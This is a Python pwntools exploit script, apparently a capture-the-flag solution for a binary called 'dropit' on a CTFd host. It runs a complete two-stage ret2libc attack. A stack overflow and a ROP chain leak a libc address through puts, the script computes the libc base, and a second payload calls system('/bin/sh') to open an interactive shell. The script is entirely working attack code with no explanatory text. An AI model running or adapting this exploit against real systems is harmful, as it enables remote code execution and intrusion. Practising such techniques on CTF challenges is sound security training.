#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('dropit')

host = args.HOST or 'challenges.ctfd.io'
port = int(args.PORT or 30261)

def local(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

if args.LOCAL:
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)

else:
    libc = ELF('./libc', checksec=False)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

# -- Stage 1 --
base = b'\x90' * 56
rop = ROP(exe)

LIBC_MAIN = exe.symbols.__libc_start_main
MAIN = exe.symbols.main
PUTS = exe.symbols.puts
FGETS = exe.symbols.fgets
SETVBUF = exe.symbols.setvbuf

RET = (rop.find_gadget(['ret']))[0]
POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0]

success(f'Main: {hex(MAIN)}')
success(f'Libc main: {hex(LIBC_MAIN)}')
success(f'Puts: {hex(PUTS)}')
success(f'Gadget[pop_rdi]: {hex(POP_RDI)}')
success(f'Gadget[ret]: {hex(RET)}')

payload = base + p64(POP_RDI) + p64(LIBC_MAIN) + p64(PUTS) + p64(MAIN)

io = start()
io.sendline(payload)

# -- Stage 2 --
leak = io.recv().strip()[2:-1].strip()

LEAKED_LIBC_START_MAIN = u64(leak.ljust(8, b'\x00'))

libc.address = LEAKED_LIBC_START_MAIN - libc.sym['__libc_start_main']

success(f'Leaked[__libc_start_main]: {hex(LEAKED_LIBC_START_MAIN)}')
success(f'Libc base: {hex(libc.address)}')

BINSH = next(libc.search(b'/bin/sh'))
SYSTEM = libc.sym['system']

success(f'Found /bin/sh: {hex(BINSH)}')
success(f'System: {hex(SYSTEM)}')

payload = base + p64(RET) + p64(POP_RDI) + p64(BINSH) + p64(SYSTEM)

io.sendline(payload)
io.interactive()
